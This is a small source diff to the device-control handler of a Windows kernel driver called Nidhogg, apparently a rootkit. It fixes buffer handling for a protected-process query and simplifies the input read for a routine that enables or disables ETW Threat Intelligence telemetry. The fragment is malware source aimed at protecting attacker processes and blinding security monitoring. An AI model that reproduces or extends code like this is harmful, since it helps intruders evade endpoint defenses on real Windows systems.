@@ -234,18 +234,18 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!VALID_SIZE(size, sizeof(ProtectedProcessesList))) {
+		if (!VALID_SIZE(size, sizeof(OutputProtectedProcessesList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = (ProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;
+		auto data = (OutputProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;
 
 		NidhoggProccessUtils->QueryProtectedProcesses(data);
 
-		len += sizeof(ProtectedProcessesList);
+		len += sizeof(OutputProtectedProcessesList);
 		break;
 	}
 
@@ -1176,11 +1176,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (bool*)Irp->AssociatedIrp.SystemBuffer;
-		MemoryAllocator<bool*> enableAllocator(&enable, sizeof(bool), PagedPool);
-		status = enableAllocator.CopyData(data, sizeof(bool));
-
-		if (!NT_SUCCESS(status))
-			break;
+		enable = *data;
 		status = NidhoggAntiAnalysis->EnableDisableEtwTI(enable);
 
 		if (!NT_SUCCESS(status))
